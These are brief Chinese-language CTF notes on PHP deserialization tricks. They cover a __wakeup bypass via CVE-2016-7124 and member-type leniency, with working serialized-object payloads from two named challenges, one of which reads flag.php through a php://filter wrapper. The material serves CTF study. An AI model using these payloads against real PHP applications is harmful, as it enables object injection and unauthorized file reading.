# PHP Unserialize

> 反序列化 all in one: https://blog.csdn.net/solitudi/article/details/113588692

## Tricks

### __wakeup 绕过

* PHP **CVE-2016-7124**：**当成员属性个数超过实际个数时，跳过`wakeup`**

* Example: *[极客大挑战 2019]PHP*

  ```php
  // Origin
  O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
  // PoC
  O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
  ```


### 成员类型

* PHP 7.1 以上不严格要求成员类型（public/private/protected），可以用`public`绕过过滤





## Examples

### [网鼎杯 2020 青龙组]AreUSerialz

* 通过`public`类型绕过`valid`字符串可打印检查
* `op`数字绕过弱等检查
* php伪协议读取文件内容

payload：

```php
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:8:"test1337";}
```

